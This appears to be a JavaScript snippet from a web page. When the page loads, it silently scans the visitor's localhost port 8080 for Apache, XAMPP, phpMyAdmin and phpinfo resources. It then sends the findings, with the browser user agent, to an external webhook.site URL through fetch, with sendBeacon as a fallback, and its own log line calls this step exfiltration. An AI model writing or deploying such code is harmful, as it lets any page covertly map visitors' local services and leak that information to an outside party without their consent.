<script>
    // TERA WEBHOOK URL
    const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
    const logBox = document.getElementById('log');
    const statusText = document.getElementById('status');

    function log(msg, type = "info") {
        const div = document.createElement('div');
        div.className = "line";
        let tagClass = type === "found" ? "tag-found" : (type === "error" ? "tag-missing" : "tag-info");
        let tagName = type === "found" ? "FOUND" : (type === "error" ? "MISSING" : "INFO");
        div.innerHTML = `<span class="tag ${tagClass}">${tagName}</span> ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function checkAsset(name, path, isHTML = false) {
        return new Promise((resolve) => {
            if (isHTML) {
                const controller = new AbortController();
                setTimeout(() => controller.abort(), 2000);

                fetch(`http://127.0.0.1:8080${path}`, { mode: 'no-cors', signal: controller.signal })
                    .then(() => {
                        log(`${name} detected`, "found");
                        resolve({ name, path, status: "FOUND" });
                    })
                    .catch(() => {
                        log(`${name} not found`, "error");
                        resolve({ name, path, status: "MISSING" });
                    });
            } else {
                const img = new Image();
                img.onload = () => {
                    log(`${name} detected`, "found");
                    resolve({ name, path, status: "FOUND" });
                };
                img.onerror = () => {
                    log(`${name} not found`, "error");
                    resolve({ name, path, status: "MISSING" });
                };
                img.src = `http://127.0.0.1:8080${path}?t=${Date.now()}`;
                setTimeout(() => resolve({ name, path, status: "TIMEOUT" }), 2500);
            }
        });
    }

    window.onload = async function() {
        log("Scanning Localhost...");

        const targets = [
            { name: "Apache Welcome", path: "/icons/apache_pb.png", html: false },
            { name: "XAMPP Logo", path: "/dashboard/images/xampp-logo.svg", html: false },
            { name: "PHPMyAdmin", path: "/phpmyadmin/index.php", html: true },
            { name: "PHP Info", path: "/dashboard/phpinfo.php", html: true }
        ];

        let scanResults = [];
        for (let t of targets) {
            const res = await checkAsset(t.name, t.path, t.html);
            scanResults.push(res);
        }

        statusText.innerText = "Audit Complete";
        log(`Exfiltrating data...`);

        // --- FIX STARTS HERE ---
        const report = {
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            results: scanResults
        };

        // Option 1: Using Blob for Clean JSON in no-cors
        const blob = new Blob([JSON.stringify(report)], {type : 'text/plain'});
        
        fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            body: blob
        }).then(() => {
            log("Report sent to Webhook!", "found");
        }).catch(() => {
            // Option 2: Beacon API (Even more reliable)
            navigator.sendBeacon(WEBHOOK, JSON.stringify(report));
            log("Report sent via Beacon.");
        });
    };
</script>
